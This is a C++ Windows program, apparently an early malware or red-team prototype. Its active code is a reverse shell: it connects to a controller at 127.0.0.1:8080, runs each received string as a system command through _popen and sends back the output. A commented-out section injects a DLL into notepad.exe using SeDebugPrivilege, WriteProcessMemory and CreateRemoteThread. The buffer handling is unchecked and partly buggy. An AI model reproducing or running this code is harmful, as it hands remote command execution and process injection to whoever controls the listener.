#include "pch.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iphlpapi.h>
#include <cstdio>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Advapi32.lib")
#define DEFAULT_BUFLEN 2048

BOOL SetDebugPrivilege(HANDLE hToken, LPCTSTR lpsz, BOOL Enable);
DWORD GetProcByName(const wchar_t *name);
int Connect();

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT "443"
int main()
{
	/*
	LPCSTR DllPath = "F:\\test\\x64\\Release\\testlib.dll";
	DWORD procID = GetProcByName(L"notepad.exe");
	if (procID == 0)
		return 1;
	HANDLE hToken;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION |
		PROCESS_VM_READ |
		PROCESS_ALL_ACCESS, FALSE, procID);
	if (hProcess == NULL)
	{
		wprintf(TEXT("Error open process\n"));
		return 1;
	}

	if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		SetDebugPrivilege(hToken, SE_DEBUG_NAME, TRUE);
	}
	
	DWORD dwSize = (strlen(DllPath) + 1) * sizeof(wchar_t);
	LPVOID FileRemote = (LPVOID)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	if (FileRemote == NULL)
	{
		wprintf(TEXT("Error allocate memory\n"));
		return 1;
	}
	DWORD n = WriteProcessMemory(hProcess, FileRemote, (LPVOID)DllPath, dwSize, NULL);
	if (n == 0)
	{
		wprintf(TEXT("Error write process memory: %u\n"), GetLastError());
		return 1;
	}
	PTHREAD_START_ROUTINE thread = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "LoadLibraryA");
	if (thread == NULL)
	{
		wprintf(TEXT("Error get load lib address\n"));
		return 1;
	}
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, thread, FileRemote, 0, NULL);
	if (hThread == NULL)
	{
		wprintf(TEXT("Error create remote thread\n"));
		return 1;
	}
	WaitForSingleObject(hThread, INFINITE);
	std::cout << "Dll path: " << FileRemote << std::endl;
	std::cin.get();
	CloseHandle(hProcess);
	CloseHandle(hThread);
	*/
	Connect();
	return 0;
}

BOOL SetDebugPrivilege(HANDLE hToken, LPCTSTR lpsz, BOOL Enable)
{
	LUID luid;
	BOOL bRet = FALSE;

	if (LookupPrivilegeValue(NULL, lpsz, &luid))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		if (Enable)
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		else
			tp.Privileges[0].Attributes = 0;
		if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
			bRet = (GetLastError() == ERROR_SUCCESS);

	}
	CloseHandle(hToken);
	return bRet;
}
DWORD GetProcByName(const wchar_t *name)
{
	HANDLE hSnap = NULL;
	PROCESSENTRY32 pe32;

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE)
	{
		wprintf(TEXT("Create snapshot failed\n"));
		return 0;
	}
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnap, &pe32))
	{
		wprintf(TEXT("Process first\n"));
		CloseHandle(hSnap);
		return 0;
	}
	do
	{
		if (!wcscmp(name, pe32.szExeFile))
		{
			CloseHandle(hSnap);
			return pe32.th32ProcessID;
		}
			
	} while (Process32Next(hSnap, &pe32));
	CloseHandle(hSnap);
	return 0;
}
int Connect()
{
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		wprintf(TEXT("Error WSAStartup: %u"), WSAGetLastError());
		return 1;
	}
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	iResult = getaddrinfo("127.0.0.1", "8080", &hints, &result);
	if (iResult != 0)
	{
		wprintf(TEXT("get address info error: %u"), WSAGetLastError());
		WSACleanup();
		return 1;
	}
	SOCKET ConnectSocket = INVALID_SOCKET;
	ptr = result;
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET)
	{
		wprintf(TEXT("Connect socket error: %u"), WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR)
	{
		wprintf(TEXT("connect error: %u"), WSAGetLastError());
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
		return 1;
	}
	freeaddrinfo(result);
	if (ConnectSocket == INVALID_SOCKET)
	{
		wprintf(TEXT("Unable to connect to server: %u"), WSAGetLastError());
		WSACleanup();
		return 1;
	}
	int recvbuflen = DEFAULT_BUFLEN;
	char sendbuf[DEFAULT_BUFLEN];
	char recvbuf[DEFAULT_BUFLEN];
	
	/*
	iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
	if (iResult == SOCKET_ERROR)
	{
		wprintf(TEXT("send fail: %u"), WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}
	wprintf(TEXT("Bytes recieve: %ld"), iResult);
	
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR)
	{
		wprintf(TEXT("Shut donw failed: %ld"), WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}
	*/
	do
	{
		memset(recvbuf, 0, DEFAULT_BUFLEN * sizeof(char));
		memset(sendbuf, 0, DEFAULT_BUFLEN * sizeof(char));
		int lenbuf = 0;
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		recvbuf[iResult + 1] = '\0';
		if (iResult > 0)
		{
			printf("%s\n", recvbuf);
			FILE *pPipe = _popen(recvbuf, "rt");
			if (pPipe == NULL)
				return 1;
			while (fgets(recvbuf, DEFAULT_BUFLEN, pPipe))
			{
				strcpy(sendbuf + lenbuf, recvbuf);
				lenbuf += (int)strlen(recvbuf);
				// iResult = send(ConnectSocket, recvbuf, (int)strlen(recvbuf), 0);
				if (iResult == SOCKET_ERROR)
				{
					wprintf(TEXT("send fail: %u"), WSAGetLastError());
					closesocket(ConnectSocket);
					WSACleanup();
					return 1;
				}
			}

			iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
			_pclose(pPipe);
		}
			
		else if (iResult == 0)
			wprintf(TEXT("Connection close"));
		else
			wprintf(TEXT("Recieve failed: %ld"), WSAGetLastError());

	} while (iResult > 0);
	return 0;

}